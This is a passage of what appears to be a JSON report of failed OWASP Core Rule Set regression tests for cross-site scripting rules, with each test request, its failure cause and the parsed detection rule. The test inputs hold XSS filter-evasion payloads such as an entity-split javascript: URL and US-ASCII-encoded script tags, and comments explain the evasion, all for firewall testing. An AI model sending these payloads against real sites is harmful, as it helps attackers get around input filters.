          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Javascript Word Detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-internet-explorer"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-xss"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "xss-perf-disable"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-XSS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.xss_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "941210",
    "test_id" : 5,
    "test_path" : "REQUEST-941-APPLICATION-ATTACK-XSS/941210.yaml",
    "description" : "Carriage return in javascript prefix, with &#13.",
    "cause" : "failed expect_id check: 941210 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 5,
      "desc" : "Carriage return in javascript prefix, with &#13.",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Accept" : "*/*",
            "Content-Type" : "application/json"
          },
          "data" : "{\"url\":\"jav&#13ascript:alert(7)\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 941210 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 941210,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This rule tries to match all the possible ways to write 'javascript' using"
        }, {
          "type" : "Comment",
          "text" : " html entities, and javascript escape sequences."
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:j|&#(?:0*(?:74|106)|x0*[46]A);)(?:[\\t\\n\\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:a|&#(?:0*(?:65|97)|x0*[46]1);)(?:[\\t\\n\\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:v|&#(?:0*(?:86|118)|x0*[57]6);)(?:[\\t\\n\\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:a|&#(?:0*(?:65|97)|x0*[46]1);)(?:[\\t\\n\\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:s|&#(?:0*(?:115|83)|x0*[57]3);)(?:[\\t\\n\\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:c|&#(?:x0*[46]3|0*(?:99|67));)(?:[\\t\\n\\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:r|&#(?:x0*[57]2|0*(?:114|82));)(?:[\\t\\n\\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:i|&#(?:x0*[46]9|0*(?:105|73));)(?:[\\t\\n\\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:p|&#(?:x0*[57]0|0*(?:112|80));)(?:[\\t\\n\\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:t|&#(?:x0*[57]4|0*(?:116|84));)(?:[\\t\\n\\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?::|&(?:#(?:0*58|x0*3A);?|colon;))."
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 941210
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cssDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Javascript Word Detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-internet-explorer"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-xss"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "xss-perf-disable"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-XSS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.xss_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "941240",
    "test_id" : 2,
    "test_path" : "REQUEST-941-APPLICATION-ATTACK-XSS/941240.yaml",
    "description" : "Status Page Test - IE XSS Filter <importimplementation= intentionally without space",
    "cause" : "failed expect_id check: 941240 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 2,
      "desc" : "Status Page Test - IE XSS Filter <importimplementation= intentionally without space",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?test=<importimplementation=",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 941240 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 941240,
      "phase" : 2,
      "chain" : false,
      "comment_block" : null,
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "<[?]?import[\\s/+\\S]*?implementation[\\s/+]*?="
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 941240
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cssDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "IE XSS Filters - Attack Detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-internet-explorer"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-xss"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "xss-perf-disable"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-XSS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.xss_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "941300",
    "test_id" : 1,
    "test_path" : "REQUEST-941-APPLICATION-ATTACK-XSS/941300.yaml",
    "description" : "IE XSS Filters",
    "cause" : "failed expect_id check: 941300 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941160 - NoScript XSS InjectionChecker: HTML Injection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler" ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "IE XSS Filters",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?%3cOBJECT%20data%20%3d=sdffdsa",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 941300 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 941300,
      "phase" : 2,
      "chain" : false,
      "comment_block" : null,
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)<OBJECT[\\s/+].*?(?:type|codetype|classid|code|data)[\\s/+]*="
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 941300
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cssDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "IE XSS Filters - Attack Detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-internet-explorer"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-xss"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "xss-perf-disable"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-XSS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.xss_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "941310",
    "test_id" : 1,
    "test_path" : "REQUEST-941-APPLICATION-ATTACK-XSS/941310.yaml",
    "description" : "Positive test using single byte",
    "cause" : "failed expect_id check: 941310 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920480 - Request content type charset is not allowed by policy", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "Positive test using single byte",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "Content-Type" : "application/x-www-form-urlencoded; charset=us-ascii",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "var=\\xbcscript\\xbealert(\\xa2XSS\\xa2)\\xbc/script\\xbe",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 941310 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 941310,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html"
        }, {
          "type" : "Comment",
          "text" : " US-ASCII encoding bypass listed on XSS filter evasion"
        }, {
          "type" : "Comment",
          "text" : " Reported by Mazin Ahmed"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This evasion covered by this chain of rules is specific to webservers that deliver content in US-ASCII."
        }, {
          "type" : "Comment",
          "text" : " Only Apache Tomcat is known (according to the page linked above) to be vulnerable to this and probably has to be"
        }, {
          "type" : "Comment",
          "text" : " misconfigured for this to happen."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Since US-ASCII is a seven bit encoding, bit 8 is ignored. Consider the following ISO 8859-1 sequence:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " scriptalert(XSS)/script"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " A filter looking for tags will usually not match against this sequence because there are no angle brackets (< / >). However,"
        }, {
          "type" : "Comment",
          "text" : " the characters where the brackets would be are ISO 8859-1 characters:"
        }, {
          "type" : "Comment",
          "text" : " - : 0x00BC"
        }, {
          "type" : "Comment",
          "text" : " - : 0x00BE"
        }, {
          "type" : "Comment",
          "text" : " - : 0x00A2"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " And this is how the sequence looks in in US-ASCII:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " <script>alert(\"XSSB\")</script/>"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This enables an attacker to craft a string that will be delivered in a form that a browser will execute as script"
        }, {
          "type" : "Comment",
          "text" : " while being ignored by input filters."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule looks for a start tag sequence that looks like \"<...>\" (checks for hex and plain to be sure)."
        }, {
          "type" : "Comment",
          "text" : " Because the bytes matched occur in many different languages encoded as multibyte characters (e.g. UTF-8)"
        }, {
          "type" : "Comment",
          "text" : " (e.g. German umlauts, Russian characters) this isn't very helpful and can cause many false positives. We, therefore,"
        }, {
          "type" : "Comment",
          "text" : " use a chained rule to also look for an end tag sequence that looks like \"</...>\". Only if the chained rule matches will"
        }, {
          "type" : "Comment",
          "text" : " the request be blocked."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This is of course still not perfect but should at least make it harder to hide most tags using this technique while"
        }, {
          "type" : "Comment",
          "text" : " requiring very specific patterns in a language to match, which should get rid of most false positives."
        }, {
          "type" : "Comment",
          "text" : " These rules would, for example, not guard against an element without an end tag, e.g. \"<img... />\"."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " US-ASCII on Wikipedia: https://en.wikipedia.org/wiki/ASCII"
        }, {
          "type" : "Comment",
          "text" : " ISO 8859-1 on Wikipedia: https://en.wikipedia.org/wiki/ISO/IEC_8859-1"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\xbc[^\\xbe>]*[\\xbe>]|<[^\\xbe]*\\xbe"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 941310
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "US-ASCII Malformed Encoding XSS Filter - Attack Detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-tomcat"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-xss"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "xss-perf-disable"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-XSS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "941310",
    "test_id" : 2,
    "test_path" : "REQUEST-941-APPLICATION-ATTACK-XSS/941310.yaml",
    "description" : "Positive test using utf-8",
    "cause" : "failed expect_id check: 941310 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920480 - Request content type charset is not allowed by policy", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 2,
      "desc" : "Positive test using utf-8",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "Content-Type" : "application/x-www-form-urlencoded; charset=us-ascii",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "var=\\xc2\\xbcscript\\xc2\\xbealert(\\xc2\\xa2XSS\\xc2\\xa2)\\xc2\\xbc/script\\xc2\\xbe",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 941310 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 941310,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html"
        }, {
          "type" : "Comment",
          "text" : " US-ASCII encoding bypass listed on XSS filter evasion"
        }, {
          "type" : "Comment",
          "text" : " Reported by Mazin Ahmed"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This evasion covered by this chain of rules is specific to webservers that deliver content in US-ASCII."
        }, {
          "type" : "Comment",
          "text" : " Only Apache Tomcat is known (according to the page linked above) to be vulnerable to this and probably has to be"
        }, {
          "type" : "Comment",
          "text" : " misconfigured for this to happen."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Since US-ASCII is a seven bit encoding, bit 8 is ignored. Consider the following ISO 8859-1 sequence:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " scriptalert(XSS)/script"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " A filter looking for tags will usually not match against this sequence because there are no angle brackets (< / >). However,"
        }, {
          "type" : "Comment",
          "text" : " the characters where the brackets would be are ISO 8859-1 characters:"
        }, {
          "type" : "Comment",
          "text" : " - : 0x00BC"
        }, {
          "type" : "Comment",
          "text" : " - : 0x00BE"
        }, {
          "type" : "Comment",
          "text" : " - : 0x00A2"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " And this is how the sequence looks in in US-ASCII:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " <script>alert(\"XSSB\")</script/>"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This enables an attacker to craft a string that will be delivered in a form that a browser will execute as script"
        }, {
          "type" : "Comment",
          "text" : " while being ignored by input filters."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule looks for a start tag sequence that looks like \"<...>\" (checks for hex and plain to be sure)."
        }, {
          "type" : "Comment",
          "text" : " Because the bytes matched occur in many different languages encoded as multibyte characters (e.g. UTF-8)"
        }, {
          "type" : "Comment",
          "text" : " (e.g. German umlauts, Russian characters) this isn't very helpful and can cause many false positives. We, therefore,"
        }, {
          "type" : "Comment",
          "text" : " use a chained rule to also look for an end tag sequence that looks like \"</...>\". Only if the chained rule matches will"
        }, {
          "type" : "Comment",
          "text" : " the request be blocked."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This is of course still not perfect but should at least make it harder to hide most tags using this technique while"
        }, {
          "type" : "Comment",
          "text" : " requiring very specific patterns in a language to match, which should get rid of most false positives."
        }, {
          "type" : "Comment",
          "text" : " These rules would, for example, not guard against an element without an end tag, e.g. \"<img... />\"."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " US-ASCII on Wikipedia: https://en.wikipedia.org/wiki/ASCII"
        }, {
          "type" : "Comment",
          "text" : " ISO 8859-1 on Wikipedia: https://en.wikipedia.org/wiki/ISO/IEC_8859-1"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\xbc[^\\xbe>]*[\\xbe>]|<[^\\xbe]*\\xbe"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 941310
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
